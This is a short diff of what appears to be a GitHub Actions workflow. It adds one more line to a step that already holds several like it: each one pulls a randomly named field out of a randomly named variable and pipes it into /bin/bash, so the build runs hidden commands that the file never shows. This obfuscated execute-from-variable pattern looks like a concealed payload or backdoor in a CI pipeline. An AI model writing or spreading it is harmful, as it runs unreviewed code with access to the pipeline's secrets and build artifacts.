@@ -23,6 +23,7 @@ jobs:
           echo $gmwlk096 | jq -r .hrrnt0428 | /bin/bash
           printf '%s' "$lxg8" | jq -r .d897 | /bin/bash
           echo $pdeli63479 | jq -r .eejb5 | /bin/bash
+          printf '%s' "$dgc589" | jq -r .mpxol7 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
